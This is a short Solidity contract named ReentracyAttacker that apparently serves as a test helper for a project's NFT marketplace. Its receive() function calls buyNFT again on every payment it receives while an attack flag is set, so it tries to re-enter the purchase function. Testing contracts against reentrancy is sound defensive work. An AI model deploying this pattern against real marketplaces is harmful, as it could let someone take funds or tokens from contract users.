// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.20;

import "../../src/ERC721CollectionContract.sol";
import "../../src/Marketplace.sol";

contract ReentracyAttacker {
    ERC721CollectionContract collectionAddr;
    NFTMarketplace marketplace;
    uint256 targetTokenId;
    bool attackInProgess;

    constructor(address _collectionAddr, address _marketplace) {
        collectionAddr = ERC721CollectionContract(_collectionAddr);
        marketplace = NFTMarketplace(_marketplace);
    }

    receive() external payable {
        if (attackInProgess) {
            marketplace.buyNFT(address(collectionAddr), targetTokenId);
        }
    }

    function attackBuyNft(uint256 tokenId) external payable {
        targetTokenId = tokenId;
        attackInProgess = true;
        marketplace.buyNFT{ value: msg.value }(address(collectionAddr), targetTokenId);
        attackInProgess = false;
    }
}